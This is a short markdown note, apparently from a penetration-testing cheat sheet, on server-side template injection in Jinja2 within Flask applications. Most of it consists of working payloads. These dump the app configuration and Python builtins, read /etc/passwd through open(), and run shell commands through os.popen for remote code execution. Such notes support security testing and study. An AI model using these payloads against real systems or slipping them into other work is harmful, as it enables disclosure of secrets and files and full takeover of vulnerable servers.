---
title: c-Jinja2
draft: false
tags:
  - ssti
  - jinja2
---
Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application. The payloads in other web frameworks might thus be slightly different.

## Information Disclosure

Let's try to obtain internal information about the web app including the configuration details and the web application's source code.

We can obtain web app's configuration by:

```jinja2
{{ config.items() }}
```

We can also execute Python code to obtain information about the web app's source code.

Dump all available built-in functions:

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

## LFI

We can use Python's built-in function `open` to include a local file.

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

## RCE

In Python, we can use functions provided by the `os` library, such as `system` or `popen`.

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```